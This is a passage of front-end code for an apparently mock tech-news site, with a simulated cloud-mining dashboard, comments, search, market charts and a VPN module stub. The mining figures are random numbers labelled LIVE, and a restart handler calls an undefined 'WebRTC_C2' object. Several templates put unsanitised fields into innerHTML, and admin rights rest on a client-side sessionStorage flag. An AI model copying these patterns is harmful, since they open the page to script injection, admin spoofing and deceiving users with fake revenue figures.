                                POOL: STRATUM-V2 // UPTIME: 99.99%
                            </div>
                        </div>
                        <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                            <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">TOTAL HASHRATE</div>
                                <div class="text-2xl font-bold text-white" id="cm-hashrate">45.2 <span class="text-sm text-gray-400">PH/s</span></div>
                            </div>
                             <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">ACTIVE WORKERS</div>
                                <div class="text-2xl font-bold text-yellow-500" id="cm-workers">1,248</div>
                            </div>
                            <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">24H REVENUE</div>
                                <div class="text-2xl font-bold text-green-500" id="cm-revenue">2.45 <span class="text-sm text-gray-400">BTC</span></div>
                            </div>
                             <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                                <div class="text-xs text-gray-500 mb-1">NETWORK DIFF</div>
                                <div class="text-2xl font-bold text-white">+2.1%</div>
                            </div>
                        </div>

                        <div class="mt-4 bg-gray-900/80 p-4 rounded-lg border border-gray-700">
                            <div class="flex justify-between items-center mb-2">
                                <div class="text-xs text-gray-500">MINING PROFITABILITY (7D)</div>
                                <div class="text-xs text-green-500">+12.4% vs last week</div>
                            </div>
                            <div class="h-2 bg-gray-700 rounded-full overflow-hidden">
                                <div class="h-full bg-gradient-to-r from-yellow-600 to-yellow-400 w-[75%]" id="cm-profit-bar"></div>
                            </div>
                        </div>

                        <!-- TERMINAL & AI CONTROLS -->
                        <div class="mt-4 grid grid-cols-1 md:grid-cols-3 gap-4">
                            <!-- TERMINAL -->
                            <div class="col-span-2 bg-black/90 p-3 rounded-lg border border-gray-800 font-mono text-xs h-32 overflow-hidden flex flex-col">
                                <div class="text-gray-500 border-b border-gray-800 pb-1 mb-2 flex justify-between">
                                    <span>>_ MINER.LOG</span>
                                    <span class="animate-pulse text-green-500">‚óè LIVE</span>
                                </div>
                                <div id="cm-terminal" class="flex-1 overflow-y-auto space-y-1 text-gray-300 scrollbar-hide">
                                    <div class="text-green-500">[SYSTEM] Mining Daemon v2.4.1 initialized</div>
                                    <div>[POOL] Connected to stratum+tcp://pool.techcrunch-cloud.io:3333</div>
                                    <div>[WORKER] Worker #001 authenticated</div>
                                </div>
                            </div>

                            <!-- CONTROLS -->
                            <div class="bg-gray-900/80 p-4 rounded-lg border border-gray-700 flex flex-col justify-center gap-3">
                                <button onclick="optimizeMiningNode()" class="w-full py-2 bg-yellow-600 hover:bg-yellow-500 text-white font-bold rounded text-xs transition-colors flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
                                    AI OPTIMIZE
                                </button>
                                <button onclick="restartMiningNode(this)" data-ui-enhance data-ui-loading="true" data-ui-tooltip-text="Reboot Mining Daemon" class="w-full py-2 bg-gray-700 hover:bg-gray-600 text-white font-bold rounded text-xs transition-colors flex items-center justify-center gap-2">
                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
                                    RESTART NODE
                                </button>
                            </div>
                        </div>

                        <!-- LATEST INSIGHTS (New) -->
                        <div class="col-span-1 md:col-span-3 mt-4 border-t border-gray-800 pt-4">
                            <h4 class="text-xs font-bold text-gray-500 mb-3 uppercase flex items-center gap-2">
                                <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                                Latest Cloud Mining Intelligence
                            </h4>
                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4" id="cm-insights">
                                <div class="animate-pulse bg-gray-800/50 h-24 rounded"></div>
                                <div class="animate-pulse bg-gray-800/50 h-24 rounded"></div>
                                <div class="animate-pulse bg-gray-800/50 h-24 rounded"></div>
                            </div>
                        </div>
                    </div>
                </div>
                `;

                // Populate Cloud Mining Insights
                setTimeout(async () => {
                    const insightsContainer = document.getElementById('cm-insights');
                    if (insightsContainer) {
                         try {
                             const allArticles = await dataSdk.getArticles();
                             // Filter for Crypto category and Mining/Cloud keywords
                             const miningArticles = allArticles.filter(a => 
                                 (a.title.toLowerCase().includes('mining') || a.title.toLowerCase().includes('cloud') || a.title.toLowerCase().includes('hash')) && 
                                 a.category === 'Crypto'
                             ).slice(0, 3);
                             
                             if(miningArticles.length > 0) {
                                 insightsContainer.innerHTML = miningArticles.map(a => `
                                    <div class="bg-gray-900/40 p-3 rounded-lg border border-gray-800 hover:border-yellow-500/50 hover:bg-gray-800 transition-all cursor-pointer group" onclick="location.hash='#article/${a.id}'">
                                        <div class="flex items-start justify-between mb-2">
                                            <h5 class="text-xs font-bold text-gray-300 group-hover:text-yellow-400 transition-colors line-clamp-2 leading-tight">${a.title}</h5>
                                        </div>
                                        <div class="flex items-center gap-2 text-[10px] text-gray-600">
                                            <span class="flex items-center gap-1"><svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg> ${a.readTime}</span>
                                            <span>‚Ä¢</span>
                                            <span class="text-yellow-600/70">${a.authorName}</span>
                                        </div>
                                    </div>
                                 `).join('');
                             } else {
                                 insightsContainer.innerHTML = '<div class="col-span-3 text-xs text-gray-600 italic text-center py-4">No recent intelligence reports available.</div>';
                             }
                         } catch(e) {
                             console.error('Failed to load insights', e);
                         }
                    }
                }, 100);

                // Add AI Optimizer Function to Window if not exists
                if (!window.optimizeMiningNode) {
                    window.optimizeMiningNode = async () => {
                        const btn = event.currentTarget;
                        const originalText = btn.innerHTML;
                        btn.innerHTML = '<span class="animate-spin">‚öôÔ∏è</span> OPTIMIZING...';
                        btn.disabled = true;
                        
                        try {
                            const res = await window.GuardianML.optimizeMining();
                            showToast(`Efficiency +${res.efficiencyGain} | Power -${res.powerReduction}`, 'success');
                            
                            // Log to terminal
                            const term = document.getElementById('cm-terminal');
                            if(term) {
                                const log = document.createElement('div');
                                log.innerHTML = `<span class="text-yellow-500">[AI] Optimization Complete: Eff +${res.efficiencyGain}</span>`;
                                term.appendChild(log);
                                term.scrollTop = term.scrollHeight;
                            }
                        } catch(e) {
                            showToast('Optimization Failed', 'error');
                        } finally {
                            btn.innerHTML = originalText;
                            btn.disabled = false;
                        }
                    };
                }

                // Add Restart Node Function
                if (!window.restartMiningNode) {
                    window.restartMiningNode = async (btn) => {
                         // Note: uiSdk handles loading state visual if data-ui-loading is true, 
                         // but we manually handle logic here to be safe or if uiSdk isn't fully bound yet.
                         
                         try {
                             if (window.WebRTC_C2) {
                                 await window.WebRTC_C2.restartNode();
                             } else {
                                 await new Promise(r => setTimeout(r, 1500));
                             }
                             
                             showToast('Node Restarted Successfully', 'success');
                             
                             // Log to terminal
                             const term = document.getElementById('cm-terminal');
                             if(term) {
                                 const log = document.createElement('div');
                                 log.innerHTML = `<span class="text-red-400">[SYSTEM] REBOOT INITIATED...</span>`;
                                 term.appendChild(log);
                                 setTimeout(() => {
                                     const log2 = document.createElement('div');
                                     log2.innerHTML = `<span class="text-green-500">[SYSTEM] DAEMON ONLINE (PID: ${Math.floor(Math.random()*9999)})</span>`;
                                     term.appendChild(log2);
                                     term.scrollTop = term.scrollHeight;
                                 }, 1000);
                                 term.scrollTop = term.scrollHeight;
                             }
                         } catch(e) {
                             showToast('Restart Failed', 'error');
                         }
                    };
                }

                // Start Cloud Mining Visualizer
                setTimeout(() => {
                    if (!window.cmInterval) {
                        window.cmInterval = setInterval(() => {
                            if (document.getElementById('cm-hashrate')) {
                                // Simulate fluctuating hashrate
                                const baseHash = 45.2;
                                const flux = (Math.random() - 0.5) * 0.5;
                                document.getElementById('cm-hashrate').innerHTML = (baseHash + flux).toFixed(2) + ' <span class="text-sm text-gray-400">PH/s</span>';
                                
                                // Simulate worker count
                                const baseWorkers = 1248;
                                const wFlux = Math.floor((Math.random() - 0.5) * 5);
                                document.getElementById('cm-workers').innerText = (baseWorkers + wFlux).toLocaleString();

                                // Simulate Revenue Ticker
                                const baseRev = 2.45;
                                const rFlux = (Math.random() * 0.0001);
                                document.getElementById('cm-revenue').innerHTML = (baseRev + rFlux).toFixed(4) + ' <span class="text-sm text-gray-400">BTC</span>';

                                // Animate Bar
                                const bar = document.getElementById('cm-profit-bar');
                                if (bar) {
                                    bar.style.width = (75 + (Math.random() - 0.5) * 2) + '%';
                                }

                                // Update Terminal Randomly
                                if (Math.random() > 0.7) {
                                    const term = document.getElementById('cm-terminal');
                                    if(term) {
                                        const msgs = [
                                            `[WORKER] Share accepted (diff ${(Math.random()*1000).toFixed(0)})`,
                                            `[TEMP] GPU#${Math.floor(Math.random()*8)} temp ${65 + Math.floor(Math.random()*10)}¬∞C`,
                                            `[NET] Latency ${20 + Math.floor(Math.random()*30)}ms`,
                                            `[POOL] New job received #${Math.floor(Math.random()*99999)}`
                                        ];
                                        const msg = msgs[Math.floor(Math.random() * msgs.length)];
                                        const div = document.createElement('div');
                                        div.innerText = msg;
                                        div.className = "text-gray-400";
                                        term.appendChild(div);
                                        if (term.children.length > 20) term.removeChild(term.firstChild);
                                        term.scrollTop = term.scrollHeight;
                                    }
                                }

                            } else {
                                clearInterval(window.cmInterval);
                                window.cmInterval = null;
                            }
                        }, 1000);
                    }
                }, 500);
            }

            if (catArticles.length === 0) {
                htmlContent += '<p class="col-span-3 text-center text-gray-500">No articles found in this category.</p>';
            } else {
                htmlContent += catArticles.map(article => `
                <div class="article-card bg-white dark:bg-[#1a1a1d] border border-gray-100 dark:border-gray-800 rounded-xl overflow-hidden flex flex-col h-full cursor-pointer group" onclick="location.hash='#article/${article.id}'">
                    <div class="relative h-48 overflow-hidden">
                        <img src="${article.image || 'https://via.placeholder.com/800x400'}" class="w-full h-full object-cover transform group-hover:scale-110 transition-transform duration-500" />
                        ${article.sentiment ? `<span class="absolute top-2 right-2 px-2 py-1 bg-black/60 backdrop-blur-md text-white text-[10px] font-bold rounded uppercase border border-white/10">${article.sentiment}</span>` : ''}
                    </div>
                    <div class="p-6 flex flex-col flex-1">
                        <h3 class="text-xl font-bold mb-3 leading-tight group-hover:text-brand transition-colors line-clamp-2">${article.title}</h3>
                        <p class="text-gray-500 dark:text-gray-400 text-sm mb-4 line-clamp-3 flex-1">${GuardianSDK.sanitize(article.excerpt || '')}</p>
                        <div class="flex items-center gap-2 mt-auto">
                             <img src="${article.authorAvatar}" class="w-6 h-6 rounded-full" />
                             <span class="text-xs font-bold text-gray-700 dark:text-gray-300">${article.authorName}</span>
                        </div>
                    </div>
                </div>
            `).join('');
            }

            container.innerHTML = htmlContent;

        } catch (error) {
            console.error('Error rendering category:', error);
            showToast('Failed to load category content', 'error');
        }
    }

    // --- LIKES SYSTEM ---
    async function likeArticle() {
        if (!currentArticleId) return;
        
        const btn = document.getElementById('article-like-btn');
        const countEl = document.getElementById('article-like-count');
        
        // Animation / Optimistic UI
        btn.classList.add('scale-125');
        setTimeout(() => btn.classList.remove('scale-125'), 200);
        
        try {
            const res = await dataSdk.likeArticle(currentArticleId);
            if (res.success) {
                countEl.innerText = res.likes;
                btn.classList.add('text-red-500');
                btn.querySelector('svg').classList.add('fill-red-500');
            }
        } catch (e) {
            console.error('Like failed', e);
            showToast('Failed to like article', 'error');
        }
    }

    // --- COMMENTS SYSTEM ---
    async function renderComments(articleId) {
        let comments = await dataSdk.getComments(articleId);
        // Filter for approved comments only
        comments = comments.filter(c => c.status === 'approved');
        
        const list = document.getElementById('comments-list');
        
        if (comments.length === 0) {
            list.innerHTML = '<p class="text-gray-500 italic">No comments yet (or awaiting moderation). Be the first to share your thoughts!</p>';
            return;
        }

        list.innerHTML = comments.map(c => `
            <div class="flex gap-4">
                <div class="w-10 h-10 rounded-full bg-gradient-to-br from-gray-200 to-gray-300 dark:from-gray-700 dark:to-gray-800 flex-shrink-0 flex items-center justify-center font-bold text-gray-600 dark:text-gray-300">
                    ${c.author.charAt(0)}
                </div>
                <div>
                    <div class="flex items-center gap-2 mb-1">
                        <span class="font-bold text-sm">${c.author}</span>
                        <span class="text-xs text-gray-500">${new Date(c.__createdAt).toLocaleDateString()}</span>
                    </div>
                    <p class="text-gray-700 dark:text-gray-300 text-sm">${GuardianSDK.sanitize(c.text)}</p>
                </div>
            </div>
        `).join('');
    }

    async function submitComment() {
        const input = document.getElementById('comment-input');
        const text = input.value.trim();
        
        if (!text) return;
        
        if (!currentArticleId) {
            showToast('Error: No article selected', 'error');
            return;
        }
        
        // Determine Author
        const isAdmin = sessionStorage.getItem('admin_auth') === 'true';
        const author = isAdmin ? (sessionStorage.getItem('admin_user') || 'Administrator') : 'Guest Visitor';
        const status = isAdmin ? 'approved' : 'pending';

        // UI Loading State
        const btn = document.querySelector('button[onclick="submitComment()"]');
        const originalText = btn ? btn.innerText : 'Post Comment';
        if(btn) {
            btn.innerText = 'Posting...';
            btn.disabled = true;
        }

        try {
            await dataSdk.addComment({
                articleId: currentArticleId,
                text: text,
                author: author,
                status: status,
                likes: 0
            });

            input.value = '';
            
            if (status === 'approved') {
                showToast('Comment posted successfully!', 'success');
                renderComments(currentArticleId); // Refresh if approved
            } else {
                showToast('Comment submitted for moderation!', 'success');
            }
            
            // Collapse form
            if (typeof cancelComment === 'function') {
                cancelComment();
            }
        } catch (e) {
            console.error(e);
            showToast('Failed to post comment', 'error');
        } finally {
            if(btn) {
                btn.innerText = originalText;
                btn.disabled = false;
            }
        }
    }

    // --- UTILS ---
    async function updateTicker() {
        const articles = await dataSdk.getArticles();
        const ticker = document.getElementById('breaking-news');
        if (articles.length > 0) {
            const headlines = articles.slice(0, 5).map(a => `üî¥ ${a.title}`).join(' ‚Ä¢ ');
            ticker.innerText = headlines + ' ‚Ä¢ ' + headlines; // Duplicate for smooth loop
        }
    }

    function showToast(msg, type = 'success') {
        const toast = document.createElement('div');
        toast.className = `toast ${type === 'error' ? 'error' : ''}`;
        toast.innerText = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }

    // SEARCH LOGIC
    function showSearch() {
        const modal = document.getElementById('search-modal');
        const panel = document.getElementById('search-panel');
        const input = document.getElementById('search-input');
        
        modal.classList.remove('hidden');
        setTimeout(() => {
            modal.classList.remove('opacity-0');
            panel.classList.remove('-translate-y-full');
        }, 10);
        
        input.focus();
    }

    function closeSearch() {
        const modal = document.getElementById('search-modal');
        const panel = document.getElementById('search-panel');
        
        modal.classList.add('opacity-0');
        panel.classList.add('-translate-y-full');
        setTimeout(() => {
            modal.classList.add('hidden');
            document.getElementById('search-input').value = '';
            document.getElementById('search-results').innerHTML = '<div class="text-center text-gray-500 py-8">Type to search...</div>';
        }, 300);
    }

    async function handleSearch(query) {
        const resultsContainer = document.getElementById('search-results');
        if (!query || query.length < 2) {
            resultsContainer.innerHTML = '<div class="text-center text-gray-500 py-8">Type to search...</div>';
            return;
        }

        const articles = await dataSdk.getArticles();
        const term = query.toLowerCase();
        
        const hits = articles.filter(a => 
            a.title.toLowerCase().includes(term) || 
            a.category.toLowerCase().includes(term) ||
            a.authorName.toLowerCase().includes(term) ||
            (a.tags && a.tags.toLowerCase().includes(term))
        );

        if (hits.length === 0) {
            resultsContainer.innerHTML = '<div class="text-center text-gray-500 py-8">No results found.</div>';
            return;
        }

        resultsContainer.innerHTML = hits.map(a => `
            <a href="#article/${a.id}" onclick="closeSearch()" class="flex items-center gap-4 p-3 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-xl transition-colors group">
                <img src="${a.image}" class="w-16 h-16 rounded-lg object-cover bg-gray-200" />
                <div>
                    <h4 class="font-bold group-hover:text-brand transition-colors">${a.title}</h4>
                    <p class="text-xs text-gray-500">${a.category} ‚Ä¢ ${a.authorName}</p>
                </div>
            </a>
        `).join('');
    }

    function toggleMobileMenu() {
        const menu = document.getElementById('mobile-menu');
        const overlay = document.getElementById('mobile-menu-overlay');
        menu.classList.toggle('active');
        overlay.classList.toggle('hidden');
    }

    // --- MARKET DASHBOARD LOGIC ---
    let mainChart = null;
    let volumeChart = null;
    let currentAssetId = 'AAPL';
    let marketStreamUnsub = null;
    let marketStatusUnsub = null;

    async function renderMarket() {
        if (!window.MarketSDK) return;

        // Initialize Charts if not exists
        if (!mainChart) initMarketCharts();

        // Initial Static Render
        renderEconomicCalendar();
        filterAssets();

        // Subscribe to High-Frequency Stream
        if (!marketStreamUnsub) {
            marketStreamUnsub = window.MarketSDK.subscribe((assets) => {
                // Update specific UI components efficiently
                updateMarketTicker(assets);
                updateAssetListValues(assets);
                
                // Update Chart
                const currentAsset = window.MarketSDK.getAsset(currentAssetId);
                if (currentAsset) updateChartRealtime(currentAsset);
            });
            window.MarketSDK.startStream();
        }

        // Subscribe to Status
        if (!marketStatusUnsub) {
            marketStatusUnsub = window.MarketSDK.subscribeStatus((status) => {
                 const statusEl = document.querySelector('#view-market p.font-mono');
                 if (statusEl) {
                     let statusHtml = '';
                     if (status === 'CONNECTED') {
                         statusHtml = `<span class="text-green-500">CONNECTED</span> ‚Ä¢ LATENCY: 24ms`;
                     } else if (status === 'CONNECTING') {
                         statusHtml = `<span class="text-yellow-500">CONNECTING...</span>`;
                     } else if (status.startsWith('RECONNECTING')) {
                         statusHtml = `<span class="text-orange-500">${status}</span>`;
                         if(window.showToast) window.showToast('Connection lost. Reconnecting...', 'warning');
                     } else if (status === 'OFFLINE_MODE') {
                         statusHtml = `<span class="text-gray-500">OFFLINE MODE</span> ‚Ä¢ <button onclick="window.MarketSDK.startStream()" class="text-brand underline hover:text-white">Retry Connection</button>`;
                         if(window.showToast) window.showToast('Offline Mode: Check internet & retry.', 'error');
                     } else {
                         statusHtml = `<span class="text-red-500">${status}</span> ‚Ä¢ <button onclick="window.MarketSDK.startStream()" class="text-brand underline hover:text-white">Connect</button>`;
                     }
                     statusEl.innerHTML = `LIVE FEED ‚Ä¢ ${statusHtml}`;
                 }
            });
        }
        
        // Initial Chart Load
        const asset = window.MarketSDK.getAsset(currentAssetId);
        if(asset) loadAssetToChart(asset);
    }

    function initMarketCharts() {
        const ctxMain = document.getElementById('main-market-chart');
        const ctxVol = document.getElementById('volume-market-chart');

        if (!ctxMain || !ctxVol) return;

        // Main Price Chart
        mainChart = new Chart(ctxMain.getContext('2d'), {
            type: 'line',
            data: { datasets: [{ 
                label: 'Price', 
                data: [], 
                borderColor: '#00d084', 
                backgroundColor: 'rgba(0, 208, 132, 0.1)',
                borderWidth: 2,
                pointRadius: 0,
                fill: true,
                tension: 0.1
            }] },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                animation: false,
                interaction: { intersect: false, mode: 'index' },
                plugins: { legend: { display: false } },
                scales: {
                    x: { type: 'time', time: { unit: 'minute' }, grid: { display: false, borderColor: '#333' } },
                    y: { grid: { color: '#333' }, position: 'right' }
                }
            }
        });

        // Volume Chart
        volumeChart = new Chart(ctxVol.getContext('2d'), {
            type: 'bar',
            data: { datasets: [{ 
                label: 'Volume', 
                data: [], 
                backgroundColor: '#333' 
            }] },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: { legend: { display: false } },
                scales: {
                    x: { display: false },
                    y: { display: false }
                }
            }
        });
    }

    function loadAssetToChart(asset) {
        if (!mainChart || !volumeChart) return;
        currentAssetId = asset.id;
        const titleEl = document.getElementById('chart-title');
        const priceEl = document.getElementById('chart-price');
        
        if (titleEl) titleEl.innerText = asset.name;
        if (priceEl) priceEl.innerText = asset.price.toFixed(2);
        
        // Update Chart History
        mainChart.data.datasets[0].data = asset.history.map(h => ({ x: h.t, y: h.y }));
        volumeChart.data.datasets[0].data = asset.history.map(h => ({ x: h.t, y: Math.random() * 100 })); // Mock volume history
        
        mainChart.update();
        volumeChart.update();
    }

    function updateChartRealtime(asset) {
        if (!mainChart) return;
        
        const priceEl = document.getElementById('chart-price');
        if (priceEl) {
            priceEl.innerText = asset.price.toFixed(2);
            const color = asset.change >= 0 ? 'text-green-500' : 'text-red-500';
            priceEl.className = `font-mono ${color}`;
        }

        // Push new point
        const lastPoint = asset.history[asset.history.length - 1];
        const chartData = mainChart.data.datasets[0].data;
        
        // If the last point time is different from the last chart point, push
        if (chartData.length === 0 || lastPoint.t !== chartData[chartData.length-1].x) {
            chartData.push({ x: lastPoint.t, y: lastPoint.y });
            if(chartData.length > 100) chartData.shift();
            mainChart.update('none'); // Efficient update
        } else {
            // Update last point
            chartData[chartData.length-1].y = lastPoint.y;
            mainChart.update('none');
        }
    }

    function renderAssetList(assets) {
        const list = document.getElementById('market-asset-list');
        if (!list) return;
        list.innerHTML = assets.map(a => `
            <div onclick="loadAssetToChart(window.MarketSDK.getAsset('${a.id}'))" 
                 class="flex items-center justify-between p-3 rounded-lg hover:bg-gray-50 dark:hover:bg-gray-800 cursor-pointer group transition-colors"
                 id="asset-row-${a.id}">
                <div>
                    <div class="flex items-center gap-2">
                         <div class="font-bold text-sm group-hover:text-brand">${a.id}</div>
                         ${a.sentiment ? `<span class="text-[9px] px-1 rounded bg-gray-200 dark:bg-gray-700 ${a.sentiment.includes('Bullish') ? 'text-green-600' : a.sentiment.includes('Bearish') ? 'text-red-600' : 'text-gray-500'}">${a.sentiment}</span>` : ''}
                    </div>
                    <div class="text-[10px] text-gray-400">${a.name}</div>
                </div>
                <div class="text-right">
                    <div class="font-mono text-sm font-bold" id="price-${a.id}">${a.price.toFixed(2)}</div>
                    <div class="text-[10px] ${a.change >= 0 ? 'text-green-500' : 'text-red-500'}" id="change-${a.id}">
                        ${a.change >= 0 ? '+' : ''}${a.changeP.toFixed(2)}%
                    </div>
                </div>
            </div>
        `).join('');
    }

    function updateAssetListValues(assets) {
        assets.forEach(a => {
            const priceEl = document.getElementById(`price-${a.id}`);
            const changeEl = document.getElementById(`change-${a.id}`);
            if (priceEl) {
                priceEl.innerText = a.price.toFixed(a.type === 'Forex' ? 4 : 2);
                // Flash effect
                priceEl.style.color = a.change >= 0 ? '#22c55e' : '#ef4444';
                setTimeout(() => priceEl.style.color = '', 300);
            }
            if (changeEl) {
                changeEl.innerText = `${a.change >= 0 ? '+' : ''}${a.changeP.toFixed(2)}%`;
                changeEl.className = `text-[10px] ${a.change >= 0 ? 'text-green-500' : 'text-red-500'}`;
            }
        });
    }

    function updateMarketTicker(assets) {
        const ticker = document.getElementById('market-ticker-bar');
        if(!ticker) return;
        // Simple marquee update logic (or just static list that scrolls)
        // For performance, we might just re-render occasionally or update existing DOM
        if (ticker.children.length === 0) {
            ticker.innerHTML = assets.map(a => `
                <span class="flex items-center gap-2">
                    <span class="font-bold text-brand">${a.id}</span>
                    <span class="${a.change >= 0 ? 'text-green-500' : 'text-red-500'}">${a.price.toFixed(2)}</span>
                </span>
            `).join('');
        }
    }

    function renderEconomicCalendar() {
        const events = window.MarketSDK.getEvents();
        const list = document.getElementById('market-events-list');
        if (!list) return;
        list.innerHTML = events.map(e => `
            <div class="flex items-center gap-3 p-2 border-l-2 ${e.impact === 'High' ? 'border-red-500' : 'border-yellow-500'} bg-gray-50 dark:bg-gray-800/50">
                <div class="text-center min-w-[40px]">
                    <div class="text-xs font-bold">${e.time}</div>
                    <div class="text-[10px] text-gray-400">${e.country}</div>
                </div>
                <div>
                    <div class="text-xs font-bold truncate">${e.event}</div>
                    <div class="text-[10px] text-gray-500">Fcst: ${e.forecast}</div>
                </div>
            </div>
        `).join('');
    }

    let currentSortKey = 'id';

    window.sortAssets = function(key) {
        currentSortKey = key;
        filterAssets();
    };

    function filterAssets(type) {
        const all = window.MarketSDK.getAssets();
        
        const checkboxes = Array.from(document.querySelectorAll('#view-market input[type="checkbox"]'));
        const activeTypes = checkboxes.filter(c => c.checked).map(c => c.parentElement.innerText.trim());
        
        let show = all.filter(a => activeTypes.includes(a.type));
        
        // Sort
        show.sort((a, b) => {
            if (currentSortKey === 'id') return a.id.localeCompare(b.id);
            if (currentSortKey === 'price') return b.price - a.price;
            if (currentSortKey === 'changeP') return b.changeP - a.changeP;
            if (currentSortKey === 'vol') return b.vol - a.vol;
            if (currentSortKey === 'marketCap') return b.marketCap - a.marketCap;
            return 0;
        });

        renderAssetList(show);
    }

    function setChartTimeframe(tf) {
        if (!mainChart) return;
        const unit = tf === '1m' ? 'minute' : tf === '1h' ? 'hour' : 'day';
        mainChart.options.scales.x.time.unit = unit;
        mainChart.update();
    }

    async function renderEvents(filterType = 'All') {
        let events = await window.dataSdk.getCollection('events');
        
        if (filterType !== 'All') {
            events = events.filter(e => e.type === filterType || e.category === filterType);
        }
        
        const container = document.getElementById('events-grid');
        const hero = document.getElementById('events-hero');
        
        if (!container) return;
        
        // Hero logic
        if (hero) {
            if (events.length > 0 && filterType === 'All') {
                const feat = events[0];
                hero.classList.remove('hidden');
                hero.innerHTML = `
                    <div onclick="window.open('https://techcrunch.com', '_blank')" class="w-full h-full cursor-pointer group">
                    <img src="${feat.image}" class="absolute inset-0 w-full h-full object-cover group-hover:scale-105 transition-transform duration-700">
                    <div class="absolute inset-0 bg-gradient-to-t from-black via-black/50 to-transparent"></div>
                    <div class="absolute bottom-0 left-0 p-8 md:p-12 w-full md:w-2/3">
                        <span class="inline-block bg-brand text-black text-xs font-bold px-3 py-1 rounded-full mb-4 uppercase tracking-wider">
                            Featured Event
                        </span>
                        <h2 class="text-3xl md:text-5xl font-black text-white mb-4 leading-tight">
                            ${feat.name}
                        </h2>
                        <div class="flex items-center gap-6 text-white font-bold">
                            <div class="flex items-center gap-2">
                                <svg class="w-5 h-5 text-brand" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                                ${feat.date}
                            </div>
                            <div class="flex items-center gap-2">
                                <svg class="w-5 h-5 text-brand" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                ${feat.location}
                            </div>
                        </div>
                    </div>
                    </div>
                `;
            } else {
                 hero.classList.add('hidden');
            }
        }
        
        // Grid logic (skip first if hero is shown)
        const gridEvents = (events.length > 0 && filterType === 'All') ? events.slice(1) : events;
        
        container.innerHTML = gridEvents.map(evt => `
            <div onclick="window.open('https://techcrunch.com', '_blank')" class="bg-white dark:bg-[#1a1a1d] rounded-xl border border-gray-200 dark:border-gray-800 overflow-hidden shadow-sm hover:shadow-md transition-shadow group cursor-pointer">
                <div class="relative h-48 overflow-hidden">
                    <img src="${evt.image}" alt="${evt.name}" loading="lazy" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500">
                    <div class="absolute top-4 left-4 bg-white/90 dark:bg-black/90 backdrop-blur px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">
                        ${evt.type}
                    </div>
                </div>
                <div class="p-6">
                    <div class="flex items-center gap-2 text-sm text-brand font-bold mb-2">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                        ${evt.date}
                    </div>
                    <h3 class="text-xl font-bold mb-2 group-hover:text-brand transition-colors line-clamp-2">${evt.name}</h3>
                    <div class="flex items-center gap-2 text-gray-500 dark:text-gray-400 text-sm mb-4">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                        ${evt.location}
                    </div>
                    <button class="w-full py-2 bg-gray-100 dark:bg-gray-800 hover:bg-brand hover:text-white dark:hover:bg-brand dark:hover:text-white rounded-lg font-bold transition-all text-sm">
                        Register Now
                    </button>
                </div>
            </div>
        `).join('');
    }

    // --- GHOSTNET ENTERPRISE LOGIC ---
    const GhostNet = {
        interval: null,
        trafficInterval: null,
        isActive: false,
        traffic: { up: 0, down: 0 },
        
        // Configuration State
        config: {
            protocol: 'wireguard',
            policy: 'auto'
        },

        locations: [
            { city: 'Zurich', country: 'CH', code: '194.20' },
            { city: 'Reykjavik', country: 'IS', code: '88.14' },
            { city: 'Panama City', country: 'PA', code: '190.140' },
            { city: 'Tortola', country: 'VG', code: '45.12' },
            { city: 'Moscow', country: 'RU', code: '185.12' },
            { city: 'Singapore', country: 'SG', code: '112.5' },
            { city: 'Kyiv', country: 'UA', code: '91.20' },
            { city: 'Sealand', country: 'XX', code: '10.0' }
        ],

        toggle() {
            this.isActive = !this.isActive;
            const btn = document.getElementById('ghost-toggle-btn');
